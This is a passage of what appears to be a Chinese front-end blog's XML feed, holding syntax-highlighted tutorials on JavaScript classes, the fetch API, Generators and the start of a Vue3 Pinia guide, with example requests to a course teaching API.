class="property">name</span> = name</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">food</span> = food</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 实例方法</span></span><br><span class="line">    <span class="title function_">sayHi</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`你好，我叫<span class="subst">$&#123;<span class="variable language_">this</span>.name&#125;</span>,我喜欢吃<span class="subst">$&#123;<span class="variable language_">this</span>.food&#125;</span>`</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> p = <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&#x27;小黑&#x27;</span>, <span class="string">&#x27;西蓝花&#x27;</span>)</span><br><span class="line">p.<span class="title function_">sayHi</span>()</span><br></pre></td></tr></table></figure><ol><li>通过<code>class 类名&#123;&#125;</code>的形式来定义类</li><li>内部直接写实例属性，可以设置默认值</li><li>实例方法的添加方式为<code>方法名()&#123;&#125;</code></li><li>构造函数通过<code>constructor</code>进行添加</li><li>通过<code>new 类名()</code>创建实例，会调用构造函数<code>constructor</code></li></ol><p><strong>class 实现继承</strong>：</p><ol><li>子类通过<code>extends</code>继承继承父类</li><li>子类如果需要重新定义构造函数,必须在内部通过<code>super</code>关键字调用父类的构造函数</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Student</span> <span class="keyword">extends</span> <span class="title class_ inherited__">Person</span> &#123;</span><br><span class="line">    song</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">name, food, song</span>) &#123;</span><br><span class="line">        <span class="comment">// 子类构造函数使用this以前必须调用super</span></span><br><span class="line">        <span class="variable language_">super</span>(name, food)</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">song</span> = song</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 添加方法</span></span><br><span class="line">    <span class="title function_">sing</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`我叫<span class="subst">$&#123;<span class="variable language_">this</span>.name&#125;</span>,我喜欢唱<span class="subst">$&#123;<span class="variable language_">this</span>.song&#125;</span>`</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> s = <span class="keyword">new</span> <span class="title class_">Student</span>(<span class="string">&#x27;李雷&#x27;</span>, <span class="string">&#x27;花菜&#x27;</span>, <span class="string">&#x27;孤勇者&#x27;</span>)</span><br><span class="line">s.<span class="title function_">sayHi</span>()</span><br><span class="line">s.<span class="title function_">sing</span>()</span><br></pre></td></tr></table></figure><p><strong>class 私有、静态属性和方法</strong>：</p><ol><li>class中私有属性&#x2F;方法<ol><li><strong>定义和使用时</strong>需要使用关键字<code>#</code></li><li>私有属性只能在类的内部使用，外部无法使用（代码中）</li><li><strong>Chrome</strong>的控制台中为了方便调试，可以直接访问</li></ol></li><li>class中静态属性&#x2F;方法<ol><li><strong>定义和使用时</strong>需要使用关键字<code>static</code></li><li>通过类访问</li><li>静态方法中的<code>this</code>是类</li></ol></li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">name</span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">name</span> = name</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 通过#作为前缀添加的属性会变为私有</span></span><br><span class="line">    <span class="comment">// 私有属性</span></span><br><span class="line">    #secret = <span class="string">&#x27;我有一个小秘密，就不告诉你&#x27;</span></span><br><span class="line">    <span class="comment">// 私有方法</span></span><br><span class="line">    #<span class="title function_">say</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="comment">// 私有属性可以在</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;私有的say方法&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">info</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="comment">// 在类的内部可以访问私有属性调用私有方法</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.#secret)</span><br><span class="line">        <span class="variable language_">this</span>.#<span class="title function_">say</span>()</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 通过 static定义静态属性/方法</span></span><br><span class="line">    <span class="keyword">static</span> <span class="title function_">staticMethod</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;这是一个静态方法&#x27;</span>)</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">static</span> info = <span class="string">&#x27;直立行走，双手双脚&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> p = <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&#x27;jack&#x27;</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(p)</span><br><span class="line"><span class="comment">// 外部无法访问 点语法访问直接报错，通过[]无法动态获取</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(p[<span class="string">&#x27;#secret&#x27;</span>])</span><br><span class="line">p.<span class="title function_">info</span>()</span><br><span class="line"><span class="comment">// 通过类访问静态属性/方法</span></span><br><span class="line"><span class="title class_">Person</span>.<span class="title function_">staticMethod</span>()</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Person</span>.<span class="property">info</span>)</span><br></pre></td></tr></table></figure><h1 id="fetch"><a href="#fetch" class="headerlink" title="fetch"></a>fetch</h1><p><strong>AJAX &amp; axios &amp; fetch的关系:</strong></p><p><code>AJAX</code>：<code>AJAX</code> 是一种基于原生 JavaScript 的异步请求技术。它使用 <code>XMLHttpRequest</code> 对象来发送请求和接收响应。</p><p><code>axios</code>：<code>axios</code> 是一个基于 Promise 的 HTTP 客户端，可以在浏览器和 Node.js 中使用。它提供了更高级别的封装，使发送请求和处理响应更加简单和灵活。</p><p><code>fetch</code>：<code>fetch</code> 是浏览器内置的 API，用于发送网络请求。它提供了一种现代化、基于 Promise 的方式来进行网络通信。用法和<code>axios</code>类似，但相比于 <code>axios</code>，它的功能和封装级别更为简单。</p><h2 id="fetch-核心语法"><a href="#fetch-核心语法" class="headerlink" title="fetch 核心语法"></a>fetch 核心语法</h2><ol><li><code>fetch</code>函数的参数:<ol><li>参数1：请求的url地址</li><li>参数2：以对象的形式设置请求相关的内容比如，方法，请求头，提交的数据等。</li></ol></li><li><code>fetch</code>获取到响应结果,需要如何解析：</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">fetch</span>(资源地址,&#123;...配置项对象&#125;)</span><br><span class="line">.<span class="title function_">then</span>(<span class="function"><span class="params">response</span>=&gt;</span>&#123;</span><br><span class="line">    <span class="comment">// 接收请求</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h2 id="GET请求"><a href="#GET请求" class="headerlink" title="GET请求"></a>GET请求</h2><ol><li><code>fetch</code>发送get请求时，不需要设置请求方法，因为默认的就是<code>get</code></li><li><code>URLSearchParams</code>可以用来创建或者解析查询字符串，这里通过它将对象转为查询字符串</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;#btn&#x27;</span>).<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> p = <span class="keyword">new</span> <span class="title class_">URLSearchParams</span>(&#123;</span><br><span class="line">        <span class="attr">pname</span>: <span class="string">&#x27;广东省&#x27;</span>,</span><br><span class="line">        <span class="attr">cname</span>: <span class="string">&#x27;广州市&#x27;</span></span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="keyword">const</span> res = <span class="keyword">await</span> <span class="title function_">fetch</span>(<span class="string">&#x27;http://hmajax.itheima.net/api/area?&#x27;</span> + p.<span class="title function_">toString</span>())</span><br><span class="line">    <span class="keyword">const</span> data = <span class="keyword">await</span> res.<span class="title function_">json</span>()</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(data);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h2 id="POST请求-提交JSON"><a href="#POST请求-提交JSON" class="headerlink" title="POST请求-提交JSON"></a>POST请求-提交JSON</h2><ol><li><code>fetch</code>函数的第二个参数可以设置请求头，请求方法，请求体，根据接口文档设置对应的内容即可</li><li>可以通过<code>JSON.stringify</code>将对象转为<code>JSON</code></li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;#btn&#x27;</span>).<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="keyword">async</span> <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">// 通过headers设置请求头</span></span><br><span class="line">    <span class="keyword">const</span> headers = <span class="keyword">new</span> <span class="title class_">Headers</span>()</span><br><span class="line">    <span class="comment">// 通过 content-type指定请求体数据格式</span></span><br><span class="line">    headers.<span class="title function_">append</span>(<span class="string">&#x27;content-type&#x27;</span>, <span class="string">&#x27;application/json&#x27;</span>)</span><br><span class="line">    <span class="comment">// 参数1 url</span></span><br><span class="line">    <span class="comment">// 参数2 请求配置</span></span><br><span class="line">    <span class="keyword">const</span> res = <span class="keyword">await</span> <span class="title function_">fetch</span>(<span class="string">&#x27;http://hmajax.itheima.net/api/register&#x27;</span>, &#123;</span><br><span class="line">        <span class="attr">method</span>: <span class="string">&#x27;post&#x27;</span>,<span class="comment">// 请求方法</span></span><br><span class="line">        headers, <span class="comment">// 请求头</span></span><br><span class="line">        <span class="comment">// 请求体</span></span><br><span class="line">        <span class="attr">body</span>: <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123; </span><br><span class="line">            <span class="attr">username</span>: <span class="string">&#x27;itheima9876&#x27;</span>, </span><br><span class="line">            <span class="attr">password</span>: <span class="string">&#x27;123456&#x27;</span> </span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="keyword">const</span> json = <span class="keyword">await</span> res.<span class="title function_">json</span>()</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(json)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h2 id="POST请求-提交FormData"><a href="#POST请求-提交FormData" class="headerlink" title="POST请求-提交FormData"></a>POST请求-提交FormData</h2><ol><li><code>fetch</code>提交<code>FormData</code>时不需要额外的设置请求头</li><li>实例化<code>FormData</code>之后可以通过<code>append(key,value)</code>方法来动态添加数据</li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">class</span>=<span class="string">&quot;file&quot;</span> <span class="attr">accept</span>=<span class="string">&quot;image/*&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.file&#x27;</span>).<span class="title function_">addEventListener</span>(<span class="string">&#x27;change&#x27;</span>, <span class="keyword">async</span> <span class="keyword">function</span> (<span class="params">e</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// 生成FormData对象并添加数据</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">const</span> data = <span class="keyword">new</span> <span class="title class_">FormData</span>()</span></span><br><span class="line"><span class="language-javascript">        data.<span class="title function_">append</span>(<span class="string">&#x27;img&#x27;</span>, <span class="variable language_">this</span>.<span class="property">files</span>[<span class="number">0</span>])</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">const</span> res = <span class="keyword">await</span> <span class="title function_">fetch</span>(<span class="string">&#x27;http://hmajax.itheima.net/api/uploadimg&#x27;</span>, &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">method</span>: <span class="string">&#x27;post&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">body</span>: data</span></span><br><span class="line"><span class="language-javascript">        &#125;)</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">const</span> json = <span class="keyword">await</span> res.<span class="title function_">json</span>()</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">console</span>.<span class="title function_">log</span>(json)</span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="Generator"><a href="#Generator" class="headerlink" title="Generator"></a>Generator</h1><p><code>Generator</code>对象由<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Statements/function*">生成器函数</a>返回并且它符合<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Iteration_protocols#%E5%8F%AF%E8%BF%AD%E4%BB%A3%E5%8D%8F%E8%AE%AE">可迭代协议</a>和<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Iteration_protocols#%E8%BF%AD%E4%BB%A3%E5%99%A8%E5%8D%8F%E8%AE%AE">迭代器协议</a>。他可以用来控制流程，语法行为和之前学习的函数不一样</p><ol><li>可以通过生成器函数(<code>function* xxx()&#123;&#125;</code>)来生成<code>Generator</code>对象:</li><li>通过<code>Generator</code>对象的<code>next</code>方法可以获取<code>yield</code>表达式之后的结果</li><li>通过<code>for of</code>获取每一个<code>yield</code>的值</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. 通过function* 创建生成器函数 </span></span><br><span class="line"><span class="keyword">function</span>* <span class="title function_">foo</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">// 遇到yield表达式时会暂停后续的操作</span></span><br><span class="line">    <span class="keyword">yield</span> <span class="string">&#x27;a&#x27;</span></span><br><span class="line">    <span class="keyword">yield</span> <span class="string">&#x27;b&#x27;</span></span><br><span class="line">    <span class="keyword">yield</span> <span class="string">&#x27;c&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;d&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 2. 调用函数获取生成器</span></span><br><span class="line"><span class="keyword">const</span> f = <span class="title function_">foo</span>()</span><br><span class="line"><span class="comment">// 3. 通过next方法获取yield 之后的表达式结果，会被包装到一个对象中</span></span><br><span class="line"><span class="comment">// 执行一次next 即可获取一次 yield之后的表达式结果</span></span><br><span class="line"><span class="keyword">const</span> res1 = f.<span class="title function_">next</span>()</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(res1)<span class="comment">// &#123;value: &#x27;a&#x27;, done: false&#125;</span></span><br><span class="line"><span class="keyword">const</span> res2 = f.<span class="title function_">next</span>()</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(res2)<span class="comment">// &#123;value: &#x27;b&#x27;, done: false&#125;</span></span><br><span class="line"><span class="keyword">const</span> res3 = f.<span class="title function_">next</span>()</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(res3)<span class="comment">// &#123;value: &#x27;c&#x27;, done: false&#125;</span></span><br><span class="line"><span class="comment">// 最后一次可以拿到return的结果</span></span><br><span class="line"><span class="keyword">const</span> res4 = f.<span class="title function_">next</span>()</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(res4)<span class="comment">// &#123;value: &#x27;d&#x27;, done: true&#125; </span></span><br><span class="line"><span class="comment">// done 为true之后，获取到的value为undefined</span></span><br><span class="line"><span class="keyword">const</span> res5 = f.<span class="title function_">next</span>()</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(res5)<span class="comment">// &#123;value: undefined, done: true&#125; </span></span><br><span class="line"><span class="comment">// 4. 通过for of 获取每一个yield之后的值，</span></span><br><span class="line"><span class="keyword">const</span> f2 = <span class="title function_">foo</span>()</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">const</span> iterator <span class="keyword">of</span> f2) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(iterator)</span><br><span class="line">&#125; <span class="comment">// &quot;abc&quot;</span></span><br></pre></td></tr></table></figure><h2 id="generator-实现id生成器"><a href="#generator-实现id生成器" class="headerlink" title="generator 实现id生成器"></a>generator 实现id生成器</h2><ol><li>定义生成器函数</li><li>内部使用循环，通过<code>yield</code>返回<code>id</code>并累加</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. 通过function* 创建生成器函数 </span></span><br><span class="line"><span class="keyword">function</span>* <span class="title function_">generator</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> id = <span class="number">0</span></span><br><span class="line">    <span class="comment">// 无限循环</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="comment">// id累加并返回</span></span><br><span class="line">        <span class="keyword">yield</span> id++</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 2. 调用函数获取生成器</span></span><br><span class="line"><span class="keyword">const</span> idMaker = <span class="title function_">generator</span>()</span><br><span class="line"><span class="comment">// 3. 需要id的时候 通过next获取即可</span></span><br><span class="line"><span class="keyword">const</span> &#123; <span class="attr">value</span>: id1 &#125; = idMaker.<span class="title function_">next</span>()</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(id1)</span><br><span class="line"><span class="keyword">const</span> &#123; <span class="attr">value</span>: id2 &#125; = idMaker.<span class="title function_">next</span>()</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(id2)</span><br></pre></td></tr></table></figure><h2 id="generator-管理异步"><a href="#generator-管理异步" class="headerlink" title="generator-管理异步"></a>generator-管理异步</h2><ol><li>使用<code>Generator</code>控制流程的本质是利用<code>yield</code>关键字来分隔逻辑比如示例中依次调用了多个接口，通过<code>yield</code>分隔,通过<code>next</code>来触发调用</li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">&quot;getWeather&quot;</span>&gt;</span>天气查询<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.bootcdn.net/ajax/libs/axios/1.3.6/axios.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">/**</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">     * 需求：流程控制，依次查询，北上广深的天气预报</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">     * 参考code: 北京 110100  上海 310100  广州 440100 深圳 440300</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">     * 接口文档: https://apifox.com/apidoc/project-1937884/api-49760220</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">     * */</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span>* <span class="title function_">weatherGenerator</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// 北京</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">yield</span> <span class="title function_">axios</span>(<span class="string">&#x27;http://hmajax.itheima.net/api/weather?city=110100&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// 上海</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">yield</span> <span class="title function_">axios</span>(<span class="string">&#x27;http://hmajax.itheima.net/api/weather?city=310100&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// 广州</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">yield</span> <span class="title function_">axios</span>(<span class="string">&#x27;http://hmajax.itheima.net/api/weather?city=440100&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// 深圳</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">yield</span> <span class="title function_">axios</span>(<span class="string">&#x27;http://hmajax.itheima.net/api/weather?city=440300&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> cityWeather = <span class="title function_">weatherGenerator</span>()</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.getWeather&#x27;</span>).<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="keyword">async</span> () =&gt; &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">await</span> cityWeather.<span class="title function_">next</span>().<span class="property">value</span>.<span class="title function_">then</span>(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">console</span>.<span class="title function_">log</span>(res.<span class="property">data</span>.<span class="property">data</span>);</span></span><br><span class="line"><span class="language-javascript">        &#125;)</span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>点击一次就获取一次，实现对异步的控制</p><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240408152908.png" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> 前端开发 </category>
          
          <category> 面试知识点 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> JavaScript </tag>
            
            <tag> 面试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vue3-Pinia工具</title>
      <link href="/2024/04/01/Vue3-Pinia%E5%B7%A5%E5%85%B7/"/>
      <url>/2024/04/01/Vue3-Pinia%E5%B7%A5%E5%85%B7/</url>
      
        <content type="html"><![CDATA[<h1 id="Pinia-简介"><a href="#Pinia-简介" class="headerlink" title="Pinia 简介"></a>Pinia 简介</h1><p>Pinia 是 Vue 专属的最新状态管理库 ，是 Vuex 状态管理工具的替代品</p><p><a href="https://pinia.vuejs.org/zh/">Vue Pinia官方库</a></p><ol><li>提供更加简单的API （去掉了 mutation ） </li><li>提供符合，组合式风格的API （和 Vue3 新语法统一） </li><li>去掉了 modules 的概念，每一个 store 都是一个独立的模块 </li><li>配合 TypeScript 更加友好，提供可靠的类型推断</li></ol><h1 id="Pinia-使用"><a href="#Pinia-使用" class="headerlink" title="Pinia 使用"></a>Pinia 使用</h1><h2 id="手动添加"><a href="#手动添加" class="headerlink" title="手动添加"></a>手动添加</h2><ol><li>用你喜欢的包管理器安装 <code>pinia</code>：</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm install pinia</span><br><span class="line">yarn add pinia</span><br></pre></td></tr></table></figure><ol start="2"><li>创建一个 pinia 实例 (根 store) 并将其传递给应用：</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; createApp &#125; <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> &#123; createPinia &#125; <span class="keyword">from</span> <span class="string">&#x27;pinia&#x27;</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">App</span> <span class="keyword">from</span> <span class="string">&#x27;./App.vue&#x27;</span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">const</span> pinia = <span class="title function_">createPinia</span>()</span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">createApp</span>(<span class="title class_">App</span>)</span><br><span class="line">  </span><br><span class="line">app.<span class="title function_">use</span>(pinia).<span class="title function_">mount</span>(<span class="string">&#x27;#app&#x27;</span>) <span class="comment">// 支持链式</span></span><br></pre></td></tr></table></figure><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><ol><li>创建 src&#x2F;store 目录，用于存放 store 数据</li><li>在数据文件中定义 store</li></ol><ul><li>与 Vue 组合式 API 的 setup 函数相似，我们可以传入一个函数，该函数定义了一些响应式属性和方法，并且返回一个带有我们想暴露出去的属性和方</li><li><code>ref()</code> 就是 <code>state</code> 属性</li><li><code>computed()</code> 就是 <code>getters</code></li><li><code>function()</code> 就是 <code>actions</code></li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; defineStore &#125; <span class="keyword">from</span> <span class="string">&quot;pinia&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; computed, ref &#125; <span class="keyword">from</span> <span class="string">&quot;vue&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> useCounterStore = 